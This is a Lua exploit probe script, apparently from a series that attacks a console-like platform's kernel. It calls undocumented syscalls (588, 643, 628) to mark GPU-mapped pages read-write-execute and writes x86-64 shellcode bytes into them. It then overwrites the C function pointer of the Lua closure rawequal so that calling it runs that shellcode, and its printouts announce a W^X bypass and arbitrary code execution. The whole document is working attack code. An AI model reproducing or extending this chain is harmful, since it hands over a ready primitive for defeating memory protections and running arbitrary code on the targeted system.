-- CRASH_CLASS: MODERATE
-- PROBE 103a: sys 588 RWX + CClosure redirect → code execution
--
-- Context: Probe 54d confirmed sys 588 (DMEM page attribute modifier) returns 0
-- with prot=7 (RWX) on GPU mmap pages. NO credential check in handler body.
-- But 54d could not verify whether execute permission was actually SET because
-- at that time we had no jump primitive.
--
-- NOW WE HAVE CClosure +0x20 redirect (56c/56f confirmed): redirect a Lua C
-- function to point at our GPU page. If sys 588 actually set EXEC permission,
-- calling that function will EXECUTE our shellcode.
--
-- This probe:
-- Section A: sys 588 RWX on GPU page + VM map verification (sys 674)
-- Section B: Write known-return shellcode + CClosure redirect to GPU page
-- Section C: Combined chain: sys 588 + chicken switches(643) + CClosure exec
-- Section D: sys 588 protection sweep + sys 624 delta observation

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 103a: SYS 588 RWX + CCLOSURE EXECUTION ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc477 = make_syscall(477)   -- mmap
local sc588 = make_syscall(588)   -- DMEM page attr modifier
local sc674 = make_syscall(674)   -- VM map query
local sc624 = make_syscall(624)   -- VM counter
local sc643 = make_syscall(643)   -- chicken switches

if TEST_SECTION == "A" then
    print("--- Section A: sys 588 RWX + VM map verification ---")
    print("  Goal: Confirm whether 588 ACTUALLY sets EXEC on GPU pages")
    print("")

    -- Step 1: Create GPU mmap page
    print("[A1] Create GPU mmap page:")
    local ok_gpu, gpu = pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_gpu then
        print("  GPU mmap FAIL")
        print("[DONE] Section A aborted")
        return
    end
    print("  GPU page: " .. fmt(gpu))

    -- Verify writable
    local wr = safe_wd(gpu, 0xDEADBEEF)
    local rd = safe_rd(gpu) or 0
    print(string.format("  Write test: %s, readback=0x%X", wr and "OK" or "FAIL", rd))
    print("")

    -- Step 2: Query VM map BEFORE sys 588
    print("[A2] VM map query BEFORE sys 588:")
    local rec_buf = memory.alloc(0x2000)
    local count_buf = memory.alloc(8)
    safe_wd(count_buf, 0)

    local ok_vm1, rv_vm1 = pcall(function()
        return sc674(uint64(0), uint64(400), uint64(rec_buf), uint64(count_buf))
    end)
    local count1 = safe_rd(count_buf) or 0
    print("  sys 674: ret=" .. (ok_vm1 and fmt(rv_vm1) or "FAIL") .. " count=" .. count1)

    -- Find our GPU page in the VM map
    local gpu_h, gpu_l = get_hi_lo(gpu)
    local gpu_prot_before = nil
    for i = 0, count1 - 1 do
        local rec_base = rec_buf + i * 72  -- 0x48 bytes per record
        local start_addr = safe_rq(rec_base)
        local end_addr = safe_rq(rec_base + 8)
        if start_addr and end_addr then
            local sh, sl = get_hi_lo(start_addr)
            local eh, el = get_hi_lo(end_addr)
            if sh == gpu_h and sl <= gpu_l and eh == gpu_h and el > gpu_l then
                local prot = safe_rd(rec_base + 0x18) or 0
                gpu_prot_before = prot
                print(string.format("  Found GPU region: %s-%s prot=0x%X",
                    fmt(start_addr), fmt(end_addr), prot))
                break
            end
        end
    end
    if not gpu_prot_before then
        print("  GPU region not found in VM map (trying all entries):")
        for i = 0, math.min(count1 - 1, 9) do
            local rec_base = rec_buf + i * 72
            local sa = safe_rq(rec_base)
            local ea = safe_rq(rec_base + 8)
            local p = safe_rd(rec_base + 0x18) or 0
            if sa then
                print(string.format("    [%d] %s-%s prot=0x%X", i, fmt(sa), fmt(ea or uint64(0)), p))
            end
        end
    end
    print("")

    -- Step 3: Call sys 588 with prot=7 (RWX)
    print("[A3] sys 588 set RWX on GPU page:")
    local attr_buf = memory.alloc(0x20)
    -- The struct is: {uint32 protection, ...}
    -- From 54d: 588(gpu_addr, 0x4000, &{prot=RWX (7)})
    safe_wd(attr_buf, 7)  -- prot = RWX
    for i = 1, 7 do safe_wd(attr_buf + i * 4, 0) end

    local ok_588, rv_588 = pcall(function()
        return sc588(gpu, uint64(0x4000), uint64(attr_buf))
    end)
    print("  sys 588(gpu, 0x4000, {prot=7}): ret=" .. (ok_588 and fmt(rv_588) or "PCALL-FAIL"))

    -- Verify page still readable/writable
    local rd2 = safe_rd(gpu)
    print(string.format("  Post-588 readback: 0x%X (expected 0xDEADBEEF)", rd2 or 0))
    print("")

    -- Step 4: Query VM map AFTER sys 588
    print("[A4] VM map query AFTER sys 588:")
    safe_wd(count_buf, 0)
    local ok_vm2, rv_vm2 = pcall(function()
        return sc674(uint64(0), uint64(400), uint64(rec_buf), uint64(count_buf))
    end)
    local count2 = safe_rd(count_buf) or 0
    print("  sys 674: ret=" .. (ok_vm2 and fmt(rv_vm2) or "FAIL") .. " count=" .. count2)

    for i = 0, count2 - 1 do
        local rec_base = rec_buf + i * 72
        local start_addr = safe_rq(rec_base)
        local end_addr = safe_rq(rec_base + 8)
        if start_addr and end_addr then
            local sh, sl = get_hi_lo(start_addr)
            local eh, el = get_hi_lo(end_addr)
            if sh == gpu_h and sl <= gpu_l and eh == gpu_h and el > gpu_l then
                local prot = safe_rd(rec_base + 0x18) or 0
                local changed = gpu_prot_before and prot ~= gpu_prot_before
                print(string.format("  Found GPU region: %s-%s prot=0x%X%s",
                    fmt(start_addr), fmt(end_addr), prot,
                    changed and " *** PROTECTION CHANGED! ***" or ""))
                if changed then
                    print(string.format("  Before: 0x%X → After: 0x%X", gpu_prot_before, prot))
                    if (prot % 256) >= 4 or (prot % 32) >= 16 then
                        print("  *** EXEC BIT IS SET — W^X BYPASS CONFIRMED! ***")
                    end
                end
                break
            end
        end
    end
    print("")

    -- Step 5: Also test prot=0x37 (mmap-style RWX)
    print("[A5] sys 588 with prot=0x37 (mmap-style RWX):")
    safe_wd(attr_buf, 0x37)
    local ok_588b, rv_588b = pcall(function()
        return sc588(gpu, uint64(0x4000), uint64(attr_buf))
    end)
    print("  sys 588(gpu, 0x4000, {prot=0x37}): ret=" .. (ok_588b and fmt(rv_588b) or "PCALL-FAIL"))
    print("")

    -- Step 6: VM counter baseline
    print("[A6] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: Shellcode write + CClosure redirect to GPU page ---")
    print("  THIS IS THE DECISIVE TEST")
    print("  If sys 588 actually set EXEC and CClosure redirect to GPU works:")
    print("  → ARBITRARY CODE EXECUTION on 14.10")
    print("")

    -- Step 1: Create GPU mmap page
    print("[B1] Create GPU mmap page:")
    local ok_gpu, gpu = pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_gpu then
        print("  GPU mmap FAIL")
        return
    end
    print("  GPU page: " .. fmt(gpu))

    -- Step 2: Write ret-sled shellcode (xor eax,eax; mov eax,0x42; ret)
    -- x86-64: 31 C0 B8 42 00 00 00 C3
    print("[B2] Write shellcode to GPU page:")
    memory.write_byte(gpu, 0x31)      -- xor eax, eax
    memory.write_byte(gpu + 1, 0xC0)
    memory.write_byte(gpu + 2, 0xB8)  -- mov eax, 0x42
    memory.write_byte(gpu + 3, 0x42)
    memory.write_byte(gpu + 4, 0x00)
    memory.write_byte(gpu + 5, 0x00)
    memory.write_byte(gpu + 6, 0x00)
    memory.write_byte(gpu + 7, 0xC3)  -- ret
    local sc_bytes = safe_rd(gpu) or 0
    print(string.format("  shellcode[0:3] = 0x%08X (expect 0x42B8C031)", sc_bytes))
    print("")

    -- Step 3: sys 588 set RWX
    print("[B3] sys 588 set RWX on GPU page:")
    local attr_buf = memory.alloc(0x20)
    safe_wd(attr_buf, 7)
    for i = 1, 7 do safe_wd(attr_buf + i * 4, 0) end
    local ok_588, rv_588 = pcall(function()
        return sc588(gpu, uint64(0x4000), uint64(attr_buf))
    end)
    print("  ret=" .. (ok_588 and fmt(rv_588) or "PCALL-FAIL"))
    print("")

    -- Step 4: Find CClosure and redirect
    print("[B4] CClosure redirect to GPU page:")
    -- Use rawequal as our target (confirmed working in 56c)
    local test_fn = rawequal
    local fn_str = tostring(test_fn)
    print("  target function: " .. fn_str)

    -- Get the CClosure's address
    local cc_addr_str = fn_str:match("(0x[0-9a-fA-F]+)")
    if not cc_addr_str then
        print("  Cannot parse CClosure address from: " .. fn_str)
        print("  Trying alternate parse...")
        -- Try to get it from the function's debug info or string representation
        local info = debug.getinfo(test_fn)
        if info then
            print("  debug.getinfo: source=" .. (info.source or "nil") ..
                " what=" .. (info.what or "nil"))
        end
        print("[DONE] Section B - cannot get CClosure address")
        return
    end

    local cc_addr = uint64(cc_addr_str)
    print("  CClosure addr: " .. fmt(cc_addr))

    -- Read +0x20 (the C function pointer)
    local orig_fn = safe_rq(cc_addr + 0x20)
    print("  Original +0x20: " .. (orig_fn and fmt(orig_fn) or "NIL"))

    -- Save original
    if not orig_fn then
        print("  Cannot read +0x20 — abort")
        return
    end

    -- Write GPU page address to +0x20
    print("  Writing GPU page addr to +0x20: " .. fmt(gpu))
    local wr_ok = safe_wq(cc_addr + 0x20, gpu)
    print("  Write result: " .. (wr_ok and "OK" or "FAIL"))

    if wr_ok then
        -- Verify the write
        local verify = safe_rq(cc_addr + 0x20)
        print("  Verify +0x20: " .. (verify and fmt(verify) or "NIL"))

        -- THE BIG TEST: Call the redirected function
        print("")
        print("[B5] *** CALLING REDIRECTED FUNCTION (GPU PAGE) ***")
        print("  If this returns 0x42: ARBITRARY CODE EXECUTION!")
        print("  If this crashes: EXEC permission not set")
        local call_ok, call_rv = pcall(function()
            return test_fn(1, 2)  -- rawequal(1,2) → redirected to GPU shellcode
        end)
        print("  call result: ok=" .. tostring(call_ok) ..
            " rv=" .. (call_ok and tostring(call_rv) or tostring(call_rv)))

        if call_ok then
            if type(call_rv) == "number" and call_rv == 0x42 then
                print("")
                print("  ████████████████████████████████████████████")
                print("  ██  ARBITRARY CODE EXECUTION CONFIRMED!  ██")
                print("  ██  Shellcode returned 0x42 from GPU pg  ██")
                print("  ████████████████████████████████████████████")
            else
                print("  Function returned (not crash), value: " .. tostring(call_rv))
                print("  Type: " .. type(call_rv))
            end
        else
            print("  Call failed/crashed: " .. tostring(call_rv))
        end

        -- Restore original
        print("")
        print("[B6] Restore original +0x20:")
        local restore_ok = safe_wq(cc_addr + 0x20, orig_fn)
        print("  Restore: " .. (restore_ok and "OK" or "FAIL"))
        local verify2 = safe_rq(cc_addr + 0x20)
        print("  Verify: " .. (verify2 and fmt(verify2) or "NIL"))

        -- Verify restore works
        local check_ok, check_rv = pcall(function()
            return test_fn(1, 1)  -- rawequal(1,1) should return true
        end)
        print("  Post-restore rawequal(1,1)=" .. tostring(check_rv))
    end
    print("")

    -- Stability
    print("[B7] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: sys 588 + chicken switches + CClosure exec ---")
    print("  Combined: set chicken bits FIRST, then sys 588 RWX, then CClosure exec")
    print("")

    -- Step 1: Set chicken bits
    print("[C1] Set chicken bits via sys 643:")
    local ok_ch, rv_ch = pcall(function() return sc643(uint64(0xFFFFFFFF)) end)
    print("  sys 643(0xFFFFFFFF): ret=" .. (ok_ch and fmt(rv_ch) or "FAIL"))
    print("")

    -- Step 2: GPU mmap
    print("[C2] Create GPU mmap page:")
    local ok_gpu, gpu = pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_gpu then
        print("  GPU mmap FAIL")
        return
    end
    print("  GPU page: " .. fmt(gpu))

    -- Step 3: Write simple shellcode: xor eax,eax; ret (returns 0)
    print("[C3] Write shellcode (xor eax,eax; ret):")
    memory.write_byte(gpu, 0x31)      -- xor eax, eax
    memory.write_byte(gpu + 1, 0xC0)
    memory.write_byte(gpu + 2, 0xC3)  -- ret
    local sc_bytes = safe_rd(gpu) or 0
    print(string.format("  bytes: 0x%08X", sc_bytes))
    print("")

    -- Step 4: sys 588 with RWX
    print("[C4] sys 588 set RWX (after chicken bits):")
    local attr_buf = memory.alloc(0x20)
    safe_wd(attr_buf, 7)
    for i = 1, 7 do safe_wd(attr_buf + i * 4, 0) end
    local ok_588, rv_588 = pcall(function()
        return sc588(gpu, uint64(0x4000), uint64(attr_buf))
    end)
    print("  ret=" .. (ok_588 and fmt(rv_588) or "PCALL-FAIL"))
    print("")

    -- Step 5: Also try sys 628 mmap with RWX (new code path)
    print("[C5] sys 628 mmap RWX (with chicken bits active):")
    local sc628 = make_syscall(628)
    local ok_628, rv_628 = pcall(function()
        return sc628(uint64(0), uint64(0x4000), uint64(0xFFFFFFFF),
            uint64(0x13), uint64(0), uint64(0))
    end)
    print("  sys 628 prot=0x13(RWX): ret=" .. (ok_628 and fmt(rv_628) or "PCALL-FAIL"))

    -- If 628 returned address, write shellcode there too
    local exec_page = gpu  -- default to GPU page
    if ok_628 then
        local h628, l628 = get_hi_lo(rv_628)
        if h628 ~= 0xFFFFFFFF and l628 ~= 0xFFFFFFFF and (h628 ~= 0 or l628 > 100) then
            print("  sys 628 returned address: " .. fmt(rv_628))
            local wr628 = safe_wd(rv_628, 0x31)
            if wr628 then
                memory.write_byte(rv_628, 0x31)
                memory.write_byte(rv_628 + 1, 0xC0)
                memory.write_byte(rv_628 + 2, 0xC3)
                exec_page = rv_628
                print("  Wrote shellcode to sys 628 page — using this for exec test")
            end
        end
    end
    print("")

    -- Step 6: CClosure redirect
    print("[C6] CClosure redirect to exec page:")
    local test_fn = rawequal
    local fn_str = tostring(test_fn)
    local cc_addr_str = fn_str:match("(0x[0-9a-fA-F]+)")
    if not cc_addr_str then
        print("  Cannot parse CClosure — abort")
        return
    end
    local cc_addr = uint64(cc_addr_str)
    local orig_fn = safe_rq(cc_addr + 0x20)
    print("  CClosure: " .. fmt(cc_addr) .. "  orig+0x20: " .. (orig_fn and fmt(orig_fn) or "NIL"))

    local wr_ok = safe_wq(cc_addr + 0x20, exec_page)
    if not wr_ok then
        print("  Write failed — abort")
        return
    end

    print("")
    print("[C7] *** CALLING REDIRECTED FUNCTION ***")
    local call_ok, call_rv = pcall(function()
        return test_fn(1, 2)
    end)
    print("  result: ok=" .. tostring(call_ok) .. " rv=" .. tostring(call_rv))

    if call_ok then
        print("  *** FUNCTION EXECUTED AND RETURNED! ***")
        print("  Return value: " .. tostring(call_rv) .. " type: " .. type(call_rv))
    else
        print("  Crashed: " .. tostring(call_rv))
    end

    -- Restore
    if orig_fn then
        safe_wq(cc_addr + 0x20, orig_fn)
        local check_ok, check_rv = pcall(function() return test_fn(1, 1) end)
        print("  Post-restore rawequal(1,1)=" .. tostring(check_rv))
    end
    print("")

    -- Stability
    print("[C8] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: sys 588 protection sweep + observation ---")
    print("")

    -- GPU mmap
    print("[D1] Create GPU mmap page:")
    local ok_gpu, gpu = pcall(function()
        return sc477(uint64(0), uint64(0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_gpu then
        print("  GPU mmap FAIL")
        return
    end
    print("  GPU page: " .. fmt(gpu))
    print("")

    -- Step 2: VM counter baseline
    local ok_base, base_ctr = pcall(function() return sc624() end)
    print("[D2] VM counter baseline: " .. (ok_base and fmt(base_ctr) or "FAIL"))
    print("")

    -- Step 3: Protection sweep
    print("[D3] sys 588 protection sweep:")
    local attr_buf = memory.alloc(0x20)
    local prots = {0, 1, 2, 3, 4, 5, 6, 7, 0x10, 0x11, 0x13, 0x20, 0x30, 0x33, 0x37, 0x77, 0xFF}
    for _, prot in ipairs(prots) do
        safe_wd(attr_buf, prot)
        for i = 1, 7 do safe_wd(attr_buf + i * 4, 0) end
        local ok_p, rv_p = pcall(function()
            return sc588(gpu, uint64(0x4000), uint64(attr_buf))
        end)
        local ok_ctr, ctr = pcall(function() return sc624() end)
        print(string.format("  prot=0x%02X: ret=%s ctr=%s",
            prot,
            ok_p and fmt(rv_p) or "FAIL",
            ok_ctr and fmt(ctr) or "?"))
    end
    print("")

    -- Step 4: Struct layout variations
    print("[D4] Struct layout variations (prot=7 at different offsets):")
    for off = 0, 28, 4 do
        for i = 0, 7 do safe_wd(attr_buf + i * 4, 0) end
        safe_wd(attr_buf + off, 7)
        local ok_v, rv_v = pcall(function()
            return sc588(gpu, uint64(0x4000), uint64(attr_buf))
        end)
        print(string.format("  prot=7 at +0x%02X: ret=%s", off,
            ok_v and fmt(rv_v) or "FAIL"))
    end
    print("")

    -- Step 5: Address range sweep
    print("[D5] Address range sensitivity:")
    local ranges = {
        {0, 0x4000, "null"},
        {0x80000000, 0x4000, "0x80M"},
        {0x100000000, 0x4000, "4GB"},
    }
    safe_wd(attr_buf, 7)
    for _, r in ipairs(ranges) do
        local addr
        if r[1] == 0 then
            addr = uint64(0)
        else
            addr = uint64(string.format("0x%X", r[1]))
        end
        local ok_r, rv_r = pcall(function()
            return sc588(addr, uint64(r[2]), uint64(attr_buf))
        end)
        print(string.format("  %s: ret=%s", r[3], ok_r and fmt(rv_r) or "FAIL"))
    end
    print("")

    -- Stability
    print("[D6] Stability:")
    local ok5, rv5 = pcall(function() return sc624() end)
    print("  sys 624=" .. (ok5 and fmt(rv5) or "FAIL"))

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 103a COMPLETE ===")
